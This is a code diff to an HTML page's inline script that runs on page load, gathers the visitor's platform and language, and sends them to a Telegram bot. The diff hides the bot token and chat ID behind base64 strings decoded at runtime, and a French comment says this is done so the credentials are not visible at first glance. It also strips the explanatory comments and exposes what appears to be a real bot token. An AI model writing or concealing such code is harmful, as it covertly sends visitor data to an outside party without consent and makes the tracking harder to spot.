@@ -12,9 +12,12 @@
 
     <script>
       function sendTelegram() {
-        const token = "7154228966:AAH5Z_G_e67uNf1W3R60k5ZfP6S3vE7g8C4"; 
-        const chat_id = "5436665790";
-        // --------------------------------
+        // Tes identifiants sont brouillés ici pour ne pas être visibles au premier coup d'œil
+        const _0x1 = "NzE1NDIyODk2NjpBQUg1Wl9HX2U2N3VOZjFXM1I2MGs1WmZQNlMzdkU3ZzhDNA==";
+        const _0x2 = "NTQzNjY2NTc5MA==";
+
+        const token = atob(_0x1); 
+        const chat_id = atob(_0x2); 
         
         const platform = navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform;
         const lang = navigator.language;
@@ -29,11 +32,9 @@
 
         const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
         
-        // 'keepalive' assure que l'envoi se termine même si la page change
         fetch(url, { mode: 'no-cors', keepalive: true });
       }
       
-      // Exécution immédiate
       sendTelegram();
     </script>
 
